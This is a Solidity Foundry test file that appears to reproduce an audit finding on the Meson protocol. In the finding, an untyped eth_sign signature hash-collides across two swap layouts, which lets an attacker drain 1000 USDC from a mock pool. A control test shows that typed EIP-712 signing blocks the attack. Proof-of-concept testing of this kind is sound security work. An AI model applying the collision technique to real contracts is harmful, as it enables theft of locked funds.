// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, MesonPool, MesonUSDC} from "./18099-hash-collisions-in-untyped-signatures-trailofbits-meson-prot.sol";

contract Finding18099Test is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    function test_exploit_one_signature_releases_a_different_swap() public {
        Exploit e = new Exploit();
        e.run();

        MesonUSDC usdc = e.token();
        MesonPool pool = e.pool();

        assertEq(usdc.balanceOf(ATTACKER), e.LOCKED(), "attacker received the locked USDC");
        assertEq(usdc.balanceOf(e.INITIATOR()), 0, "signer received nothing");
        assertEq(usdc.balanceOf(address(pool)), 0, "pool emptied");

        assertEq(e.LOCKED(), 1_000e6, "1000 USDC released");
        assertEq(pool.amountOf(e.SWAP1()), 61_063_167_274, "signed amount");
        assertEq(pool.feeOf(e.SWAP1()), 60_601_668_203, "signed fee");
        assertEq(pool.netOf(e.SWAP1()), 461_499_071, "signed net");
        assertEq(pool.outTokenOf(e.SWAP1()), 9, "signed out-token");
        assertEq(pool.amountOf(e.SWAP2()), 1_000e6, "released amount");
        assertEq(pool.outTokenOf(e.SWAP2()), 1, "released out-token");
        assertTrue(pool.amountOf(e.SWAP1()) != pool.amountOf(e.SWAP2()), "amounts differ");

        // The audited collision: the request word is the release body.
        assertEq(
            e.SWAP1(),
            uint256(keccak256(abi.encodePacked(e.SWAP2(), ATTACKER))),
            "swap1 = keccak256(swap2, attacker)"
        );
        assertEq(
            pool.requestDigest(e.SWAP1()),
            pool.releaseDigest(e.SWAP2(), ATTACKER),
            "one eth_sign digest covers both layouts"
        );

        bytes28 header = bytes28(0x19457468657265756d205369676e6564204d6573736167653a0a3332);
        assertEq(header, bytes28(bytes("\x19Ethereum Signed Message:\n32")), "prefix");
    }

    function test_control_typed_domain_rejects_the_same_signature() public {
        Exploit e = new Exploit();
        MesonPool pool = e.pool();
        MesonUSDC usdc = e.token();

        pool.fund(e.LOCKED());
        pool.lock(e.SWAP2(), e.INITIATOR());

        bool typedOk = pool.releaseTyped(e.SWAP2(), ATTACKER, e.SIG_V(), e.SIG_R(), e.SIG_S());
        assertFalse(typedOk, "EIP-712 release accepted the untyped signature");

        assertEq(usdc.balanceOf(ATTACKER), 0, "attacker was paid on the typed path");
        assertEq(usdc.balanceOf(address(pool)), e.LOCKED(), "locked 1000 USDC stayed in the pool");
        assertTrue(pool.locked(), "swap still locked");
    }
}
